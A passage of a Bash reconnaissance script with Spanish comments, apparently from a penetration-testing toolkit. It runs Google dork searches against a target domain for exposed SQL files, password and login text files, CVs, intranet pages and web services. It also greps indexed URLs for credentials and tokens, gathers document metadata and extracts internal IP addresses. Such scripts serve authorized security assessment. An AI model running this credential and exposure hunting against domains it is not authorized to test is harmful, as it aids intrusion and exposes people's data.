sed -i '/^\s*$/d' logs/vulnerabilidades/"$DOMINIO"_google_googlehacking2.txt # delete empty lines	
cat logs/vulnerabilidades/"$DOMINIO"_google_googlehacking2.txt >> .vulnerabilidades/"$DOMINIO"_google_googlehacking.txt	
echo "" >> .vulnerabilidades/"$DOMINIO"_google_googlehacking.txt	
fi

sleep 10;

google.pl -t "site:$DOMINIO filetype:sql" -o logs/vulnerabilidades/"$DOMINIO"_google_googlehacking3.txt -p 1 -l logs/vulnerabilidades/"$DOMINIO"_google_googlehacking3.html 
egrep -qi "No se han encontrado resultados|did not match any" logs/vulnerabilidades/"$DOMINIO"_google_googlehacking3.html
greprc=$?
if [[ $greprc -eq 1 ]] ; then # hay resultados
echo "site:$DOMINIO filetype:sql" >> .vulnerabilidades/"$DOMINIO"_google_googlehacking.txt	
sed -i '/^\s*$/d' logs/vulnerabilidades/"$DOMINIO"_google_googlehacking3.txt # delete empty lines	
cat logs/vulnerabilidades/"$DOMINIO"_google_googlehacking3.txt >> .vulnerabilidades/"$DOMINIO"_google_googlehacking.txt	
echo "" >> .vulnerabilidades/"$DOMINIO"_google_googlehacking.txt	
fi

sleep 10;

google.pl -t "site:$DOMINIO \"access denied for user\"" -o logs/vulnerabilidades/"$DOMINIO"_google_googlehacking4.txt -p 1 -l logs/vulnerabilidades/"$DOMINIO"_google_googlehacking4.html 
egrep -qi "No se han encontrado resultados|did not match any" logs/vulnerabilidades/"$DOMINIO"_google_googlehacking4.html
greprc=$?
if [[ $greprc -eq 1 ]] ; then # hay resultados
echo "site:$DOMINIO \"access denied for user\"" >> .vulnerabilidades/"$DOMINIO"_google_googlehacking.txt	
sed -i '/^\s*$/d' logs/vulnerabilidades/"$DOMINIO"_google_googlehacking4.txt # delete empty lines	
cat logs/vulnerabilidades/"$DOMINIO"_google_googlehacking4.txt >> .vulnerabilidades/"$DOMINIO"_google_googlehacking.txt	
echo "" >> .vulnerabilidades/"$DOMINIO"_google_googlehacking.txt	
fi

sleep 10;

google.pl -t "site:$DOMINIO intitle:\"curriculum vitae\"" -o logs/vulnerabilidades/"$DOMINIO"_google_googlehacking5.txt -p 1 -l logs/vulnerabilidades/"$DOMINIO"_google_googlehacking5.html 
egrep -qi "No se han encontrado resultados|did not match any" logs/vulnerabilidades/"$DOMINIO"_google_googlehacking5.html
greprc=$?
if [[ $greprc -eq 1 ]] ; then # hay resultados
echo "site:$DOMINIO intitle:\"curriculum vitae\"" >> .vulnerabilidades/"$DOMINIO"_google_googlehacking.txt	
sed -i '/^\s*$/d' logs/vulnerabilidades/"$DOMINIO"_google_googlehacking5.txt # delete empty lines	
cat logs/vulnerabilidades/"$DOMINIO"_google_googlehacking5.txt >> .vulnerabilidades/"$DOMINIO"_google_googlehacking.txt
echo "" >> .vulnerabilidades/"$DOMINIO"_google_googlehacking.txt		
fi

sleep 10;

google.pl -t "site:$DOMINIO passwords|contrasenas|login|contrasena filetype:txt" -o logs/vulnerabilidades/"$DOMINIO"_google_googlehacking6.txt -p 1 -l logs/vulnerabilidades/"$DOMINIO"_google_googlehacking6.html 
egrep -qi "No se han encontrado resultados|did not match any" logs/vulnerabilidades/"$DOMINIO"_google_googlehacking6.html
greprc=$?
if [[ $greprc -eq 1 ]] ; then # hay resultados
echo "site:$DOMINIO passwords|contrasenas|login|contrasena filetype:txt" >> .vulnerabilidades/"$DOMINIO"_google_googlehacking.txt	
sed -i '/^\s*$/d' logs/vulnerabilidades/"$DOMINIO"_google_googlehacking6.txt # delete empty lines	
cat logs/vulnerabilidades/"$DOMINIO"_google_googlehacking6.txt >> .vulnerabilidades/"$DOMINIO"_google_googlehacking.txt	
echo "" >> .vulnerabilidades/"$DOMINIO"_google_googlehacking.txt	
fi

sleep 10;

google.pl -t "site:$DOMINIO inurl:intranet" -o logs/enumeracion/"$DOMINIO"_google_googlehacking7.txt -p 1 -l logs/enumeracion/"$DOMINIO"_google_googlehacking7.html 
egrep -qi "No se han encontrado resultados|did not match any" logs/enumeracion/"$DOMINIO"_google_googlehacking7.html
greprc=$?
if [[ $greprc -eq 1 ]] ; then # hay resultados
echo "site:$DOMINIO inurl:intranet" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
sed -i '/^\s*$/d' logs/enumeracion/"$DOMINIO"_google_googlehacking7.txt # delete empty lines	
cat logs/enumeracion/"$DOMINIO"_google_googlehacking7.txt >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
echo "" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
fi

sleep 10;

google.pl -t "site:$DOMINIO inurl:\":8080\" -intext:8080" -o logs/enumeracion/"$DOMINIO"_google_googlehacking8.txt -p 1 -l logs/enumeracion/"$DOMINIO"_google_googlehacking8.html 
egrep -qi "No se han encontrado resultados|did not match any" logs/enumeracion/"$DOMINIO"_google_googlehacking8.html
greprc=$?
if [[ $greprc -eq 1 ]] ; then # hay resultados
echo "site:$DOMINIO inurl:\":8080\" -intext:8080" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
sed -i '/^\s*$/d' logs/enumeracion/"$DOMINIO"_google_googlehacking8.txt # delete empty lines	
cat logs/enumeracion/"$DOMINIO"_google_googlehacking8.txt >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
echo "" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
fi

sleep 10;

google.pl -t "site:$DOMINIO filetype:asmx OR filetype:svc OR inurl:wsdl" -o logs/enumeracion/"$DOMINIO"_google_googlehacking9.txt -p 1 -l logs/enumeracion/"$DOMINIO"_google_googlehacking9.html 
egrep -qi "No se han encontrado resultados|did not match any" logs/enumeracion/"$DOMINIO"_google_googlehacking9.html
greprc=$?
if [[ $greprc -eq 1 ]] ; then # hay resultados
echo "site:$DOMINIO filetype:asmx OR filetype:svc OR inurl:wsdl" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
sed -i '/^\s*$/d' logs/enumeracion/"$DOMINIO"_google_googlehacking9.txt # delete empty lines	
cat logs/enumeracion/"$DOMINIO"_google_googlehacking9.txt >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
echo "" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
fi

sleep 10;

google.pl -t "site:$DOMINIO inurl:(_vti_bin|api|webservice)" -o logs/enumeracion/"$DOMINIO"_google_googlehacking10.txt -p 1 -l logs/enumeracion/"$DOMINIO"_google_googlehacking10.html 
egrep -qi "No se han encontrado resultados|did not match any" logs/enumeracion/"$DOMINIO"_google_googlehacking10.html
greprc=$?
if [[ $greprc -eq 1 ]] ; then # hay resultados
echo "site:$DOMINIO inurl:(_vti_bin|api|webservice)" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
sed -i '/^\s*$/d' logs/enumeracion/"$DOMINIO"_google_googlehacking10.txt # delete empty lines	
# cat logs/enumeracion/"$DOMINIO"_google_googlehacking10.txt >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# echo "" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# fi

# sleep 10;

# google.pl -t "site:trello.com $keyword" -o logs/vulnerabilidades/"$DOMINIO"_google_googlehacking11.txt -p 1 -l logs/vulnerabilidades/"$DOMINIO"_google_googlehacking11.html 
# egrep -qi "No se han encontrado resultados|did not match any" logs/vulnerabilidades/"$DOMINIO"_google_googlehacking11.html
# greprc=$?
# if [[ $greprc -eq 1 ]] ; then # hay resultados
# echo "site:trello.com $keyword" >> .vulnerabilidades/"$DOMINIO"_google_googlehacking.txt	
# sed -i '/^\s*$/d' logs/vulnerabilidades/"$DOMINIO"_google_googlehacking11.txt # delete empty lines	
# cat logs/vulnerabilidades/"$DOMINIO"_google_googlehacking11.txt >> .vulnerabilidades/"$DOMINIO"_google_googlehacking.txt	
# echo "" >> .vulnerabilidades/"$DOMINIO"_google_googlehacking.txt	
# fi

# sleep 10;
# 													   #logs/vulnerabilidades/abc.gob.bo_google_googlehacking12.txt														
# google.pl -t "site:pastebin.com $keyword" -o logs/enumeracion/"$DOMINIO"_google_googlehacking12.txt -p 1 -l logs/enumeracion/"$DOMINIO"_google_googlehacking12.html 
# egrep -qi "No se han encontrado resultados|did not match any" logs/enumeracion/"$DOMINIO"_google_googlehacking12.html
# greprc=$?
# if [[ $greprc -eq 1 ]] ; then # hay resultados
# echo "site:pastebin.com $keyword" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# sed -i '/^\s*$/d' logs/enumeracion/"$DOMINIO"_google_googlehacking12.txt # delete empty lines	
# cat logs/enumeracion/"$DOMINIO"_google_googlehacking12.txt >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# echo "" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# fi

# sleep 10;

# google.pl -t "site:$DOMINIO \"Undefined index\" " -o logs/vulnerabilidades/"$DOMINIO"_google_googlehacking13.txt -p 1 -l logs/vulnerabilidades/"$DOMINIO"_google_googlehacking13.html 
# egrep -qi "No se han encontrado resultados|did not match any" logs/vulnerabilidades/"$DOMINIO"_google_googlehacking13.html
# greprc=$?
# if [[ $greprc -eq 1 ]] ; then # hay resultados
# echo "site:$DOMINIO \"Undefined index\" " >> .vulnerabilidades/"$DOMINIO"_google_googlehacking.txt	
# sed -i '/^\s*$/d' logs/vulnerabilidades/"$DOMINIO"_google_googlehacking13.txt # delete empty lines	
# cat logs/vulnerabilidades/"$DOMINIO"_google_googlehacking13.txt >> .vulnerabilidades/"$DOMINIO"_google_googlehacking.txt	
# echo "" >> .vulnerabilidades/"$DOMINIO"_google_googlehacking.txt	
# fi

# sleep 10;

# google.pl -t "site:*.atlassian.net $keyword" -o logs/enumeracion/"$DOMINIO"_google_googlehacking14.txt -p 1 -l logs/enumeracion/"$DOMINIO"_google_googlehacking14.html 
# egrep -qi "No se han encontrado resultados|did not match any" logs/enumeracion/"$DOMINIO"_google_googlehacking14.html
# greprc=$?
# if [[ $greprc -eq 1 ]] ; then # hay resultados
# echo "site:*.atlassian.net $keyword" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# sed -i '/^\s*$/d' logs/enumeracion/"$DOMINIO"_google_googlehacking14.txt # delete empty lines	
# cat logs/enumeracion/"$DOMINIO"_google_googlehacking14.txt >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# echo "" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# fi



# google.pl -t "site:codepad.co $keyword" -o logs/enumeracion/"$DOMINIO"_google_googlehacking15.txt -p 1 -l logs/enumeracion/"$DOMINIO"_google_googlehacking15.html 
# egrep -qi "No se han encontrado resultados|did not match any" logs/enumeracion/"$DOMINIO"_google_googlehacking15.html
# greprc=$?
# if [[ $greprc -eq 1 ]] ; then # hay resultados
#  echo "site:codepad.co $keyword" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
#  sed -i '/^\s*$/d' logs/enumeracion/"$DOMINIO"_google_googlehacking15.txt # delete empty lines	
#  cat logs/enumeracion/"$DOMINIO"_google_googlehacking15.txt >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
#  echo "" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# fi


# google.pl -t "site:scribd.com $keyword" -o logs/enumeracion/"$DOMINIO"_google_googlehacking16.txt -p 1 -l logs/enumeracion/"$DOMINIO"_google_googlehacking16.html 
# egrep -qi "No se han encontrado resultados|did not match any" logs/enumeracion/"$DOMINIO"_google_googlehacking16.html
# greprc=$?
# if [[ $greprc -eq 1 ]] ; then # hay resultados
# echo "site:scribd.com $keyword" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# sed -i '/^\s*$/d' logs/enumeracion/"$DOMINIO"_google_googlehacking16.txt # delete empty lines	
# cat logs/enumeracion/"$DOMINIO"_google_googlehacking16.txt >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# echo "" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# fi



# google.pl -t "site:libraries.io $keyword" -o logs/enumeracion/"$DOMINIO"_google_googlehacking17.txt -p 1 -l logs/enumeracion/"$DOMINIO"_google_googlehacking17.html 
# egrep -qi "No se han encontrado resultados|did not match any" logs/enumeracion/"$DOMINIO"_google_googlehacking17.html
# greprc=$?
# if [[ $greprc -eq 1 ]] ; then # hay resultados
# echo "site:libraries.io $keyword" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# sed -i '/^\s*$/d' logs/enumeracion/"$DOMINIO"_google_googlehacking17.txt # delete empty lines	
# cat logs/enumeracion/"$DOMINIO"_google_googlehacking17.txt >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# echo "" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# fi



# google.pl -t "site:coggle.it $keyword" -o logs/enumeracion/"$DOMINIO"_google_googlehacking18.txt -p 1 -l logs/enumeracion/"$DOMINIO"_google_googlehacking18.html 
# egrep -qi "No se han encontrado resultados|did not match any" logs/enumeracion/"$DOMINIO"_google_googlehacking18.html
# greprc=$?
# if [[ $greprc -eq 1 ]] ; then # hay resultados
# echo "site:coggle.it $keyword" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# sed -i '/^\s*$/d' logs/enumeracion/"$DOMINIO"_google_googlehacking18.txt # delete empty lines	
# cat logs/enumeracion/"$DOMINIO"_google_googlehacking18.txt >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# echo "" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# fi



# google.pl -t "site:papaly.com $keyword" -o logs/enumeracion/"$DOMINIO"_google_googlehacking19.txt -p 1 -l logs/enumeracion/"$DOMINIO"_google_googlehacking19.html 
# egrep -qi "No se han encontrado resultados|did not match any" logs/enumeracion/"$DOMINIO"_google_googlehacking19.html
# greprc=$?
# if [[ $greprc -eq 1 ]] ; then # hay resultados
# echo "site:papaly.com $keyword" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# sed -i '/^\s*$/d' logs/enumeracion/"$DOMINIO"_google_googlehacking19.txt # delete empty lines	
# cat logs/enumeracion/"$DOMINIO"_google_googlehacking19.txt >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# echo "" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# fi



# google.pl -t "site:prezi.com $keyword" -o logs/enumeracion/"$DOMINIO"_google_googlehacking20.txt -p 1 -l logs/enumeracion/"$DOMINIO"_google_googlehacking20.html 
# egrep -qi "No se han encontrado resultados|did not match any" logs/enumeracion/"$DOMINIO"_google_googlehacking20.html
# greprc=$?
# if [[ $greprc -eq 1 ]] ; then # hay resultados
# echo "site:prezi.com $keyword" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# sed -i '/^\s*$/d' logs/enumeracion/"$DOMINIO"_google_googlehacking20.txt # delete empty lines	
# cat logs/enumeracion/"$DOMINIO"_google_googlehacking20.txt >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# echo "" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# fi



# google.pl -t "site:jsdelivr.net  $keyword" -o logs/enumeracion/"$DOMINIO"_google_googlehacking21.txt -p 1 -l logs/enumeracion/"$DOMINIO"_google_googlehacking21.html 
# egrep -qi "No se han encontrado resultados|did not match any" logs/enumeracion/"$DOMINIO"_google_googlehacking21.html
# greprc=$?
# if [[ $greprc -eq 1 ]] ; then # hay resultados
# echo "site:jsdelivr.net  $keyword" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# sed -i '/^\s*$/d' logs/enumeracion/"$DOMINIO"_google_googlehacking21.txt # delete empty lines	
# cat logs/enumeracion/"$DOMINIO"_google_googlehacking21.txt >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# echo "" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# fi


# google.pl -t "site:codepen.io  $keyword" -o logs/enumeracion/"$DOMINIO"_google_googlehacking22.txt -p 1 -l logs/enumeracion/"$DOMINIO"_google_googlehacking22.html 
# egrep -qi "No se han encontrado resultados|did not match any" logs/enumeracion/"$DOMINIO"_google_googlehacking22.html
# greprc=$?
# if [[ $greprc -eq 1 ]] ; then # hay resultados
# echo "site:codepen.io  $keyword" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# sed -i '/^\s*$/d' logs/enumeracion/"$DOMINIO"_google_googlehacking22.txt # delete empty lines	
# cat logs/enumeracion/"$DOMINIO"_google_googlehacking22.txt >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# echo "" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# fi



# google.pl -t "site:repl.it  $keyword" -o logs/enumeracion/"$DOMINIO"_google_googlehacking23.txt -p 1 -l logs/enumeracion/"$DOMINIO"_google_googlehacking23.html 
# egrep -qi "No se han encontrado resultados|did not match any" logs/enumeracion/"$DOMINIO"_google_googlehacking23.html
# greprc=$?
# if [[ $greprc -eq 1 ]] ; then # hay resultados
# echo "site:repl.it  $keyword" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# sed -i '/^\s*$/d' logs/enumeracion/"$DOMINIO"_google_googlehacking23.txt # delete empty lines	
# cat logs/enumeracion/"$DOMINIO"_google_googlehacking23.txt >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# echo "" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# fi


# google.pl -t "site:gitter.im  $keyword" -o logs/enumeracion/"$DOMINIO"_google_googlehacking24.txt -p 1 -l logs/enumeracion/"$DOMINIO"_google_googlehacking24.html 
# egrep -qi "No se han encontrado resultados|did not match any" logs/enumeracion/"$DOMINIO"_google_googlehacking24.html
# greprc=$?
# if [[ $greprc -eq 1 ]] ; then # hay resultados
# echo "site:gitter.im  $keyword" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# sed -i '/^\s*$/d' logs/enumeracion/"$DOMINIO"_google_googlehacking24.txt # delete empty lines	
# cat logs/enumeracion/"$DOMINIO"_google_googlehacking24.txt >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# echo "" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# fi


# google.pl -t "site:bitbucket.org  $keyword" -o logs/enumeracion/"$DOMINIO"_google_googlehacking25.txt -p 1 -l logs/enumeracion/"$DOMINIO"_google_googlehacking25.html 
# egrep -qi "No se han encontrado resultados|did not match any" logs/enumeracion/"$DOMINIO"_google_googlehacking25.html
# greprc=$?
# if [[ $greprc -eq 1 ]] ; then # hay resultados
# echo "site:bitbucket.org  $keyword" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# sed -i '/^\s*$/d' logs/enumeracion/"$DOMINIO"_google_googlehacking25.txt # delete empty lines	
# cat logs/enumeracion/"$DOMINIO"_google_googlehacking25.txt >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# echo "" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
# fi



# #echo "Ejecutando: sort logs/enumeracion/"$DOMINIO"_google_indexado2.txt | uniq | egrep -v"
# sort .enumeracion/*_indexado.txt | uniq | egrep -v "pdf|doc" > .enumeracion/"$DOMINIO"_google_indexado.txt
# egrep -ia "username|usuario|password|contrase|token|sesion|session" .enumeracion/*google_indexado.txt > .vulnerabilidades/"$DOMINIO"_google_credencialURL.txt
# #insert_data


# # mover los listados de URL identificados por google (Dejas solo los .html en la carpeta log)
# mv logs/vulnerabilidades/*_google_googlehacking*.txt .vulnerabilidades2/ 2>/dev/null
# #insert_data
# sleep 90
############## hasta aca

echo -e "$OKBLUE+ -- --=############ Recopilando Metadatos ... #########$RESET" 
pymeta.sh -d $DOMINIO -dir `pwd`"/archivos/" -csv -out `pwd`"/reportes/metada.csv" 2>/dev/null
cat reportes/metada.csv | cut -d "," -f4 | sort | uniq > .enumeracion/"$DOMINIO"_metadata_pymeta.txt
##insert_data
sleep 90

####Extraer datos para informe
##### motores de busqueda
#echo "Nombre;Apellido;Correo;Cargo" > reportes/correos_motoresBusqueda.csv
#for correo in `cat logs/enumeracion/theHarvester_* | grep --color=never "\@" | grep -v "*"`; do	
#echo "n/a;n/a;$correo;n/a" >> reportes/correos_motoresBusqueda.csv 
#done
################

grep --color=never -ira "10\." logs/enumeracion/gobuster.txt | sort | uniq >> .vulnerabilidades/"$DOMINIO"_dns_IPinterna.txt
grep --color=never -ira "192\.1" logs/enumeracion/gobuster.txt | sort | uniq >> .vulnerabilidades/"$DOMINIO"_dns_IPinterna.txt
grep --color=never -ira "172\.1" logs/enumeracion/gobuster.txt | sort | uniq >> .vulnerabilidades/"$DOMINIO"_dns_IPinterna.txt

insert_data

